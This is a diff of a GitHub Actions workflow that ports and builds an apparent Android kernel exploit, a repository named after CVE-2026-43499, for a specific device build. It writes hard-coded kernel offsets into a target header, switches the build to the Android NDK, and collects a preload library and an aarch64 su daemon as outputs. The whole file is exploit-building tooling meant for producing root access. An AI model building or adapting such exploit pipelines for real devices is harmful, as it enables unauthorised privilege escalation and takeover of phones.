@@ -1,9 +1,9 @@
-name: build_k40_port_for_m36_v3
+name: build_k40_port_for_m36_v4
 on: [push, workflow_dispatch]
 
 jobs:
   build:
-    runs-on: ubuntu-24.04-arm
+    runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
 
@@ -11,6 +11,13 @@ jobs:
         run: |
           sudo DEBIAN_FRONTEND=noninteractive apt-get update -y
           sudo DEBIAN_FRONTEND=noninteractive apt-get install -y gcc clang make git
+
+      - name: Setup Android NDK
+        uses: nttld/setup-ndk@v1
+        id: setup-ndk
+        with:
+          ndk-version: r27c
+          add-to-path: true
 
       - name: Clone K40 port
         run: |
@@ -20,9 +27,7 @@ jobs:
       - name: Patch target.h for M36
         run: |
           cd ghostlock-cve-2026-43499-4.19-k40
-          
           mkdir -p src/targets/blazer-CP2A.260605.012
-          
           cat << 'EOF' > src/targets/blazer-CP2A.260605.012/target.h
           #pragma once
           #include <stdint.h>
@@ -49,21 +54,22 @@ jobs:
           #define ASHMEM_MISC_OFF         0
           #define EMPTY_ZERO_PAGE_OFF     0x190e000UL
           EOF
-
           echo "=== target.h created in blazer dir ==="
           ls -la src/targets/blazer-CP2A.260605.012/
 
-      - name: Build the exploit (with fixed include paths)
+      - name: Build the exploit with NDK
+        env:
+          ANDROID_NDK_HOME: ${{ steps.setup-ndk.outputs.ndk-path }}
         run: |
           cd ghostlock-cve-2026-43499-4.19-k40
-          make PROJECT=blazer-CP2A.260605.012 CFLAGS="-I/usr/include/aarch64-linux-gnu"
+          make PROJECT=blazer-CP2A.260605.012 NDK_ROOT="$ANDROID_NDK_HOME"
           
           echo "=== Built files ==="
           find . -name "*.so" -o -name "exploit" -o -name "preload*" | head -n 20
           
           mkdir -p /tmp/out
           find . -name "preload.so" -exec cp {} /tmp/out/ \;
-          find . -name "exploit" -exec cp {} /tmp/out/ \;
+          find . -name "su_daemon_aarch64_pie" -exec cp {} /tmp/out/ \;
           
           ls -la /tmp/out/
 
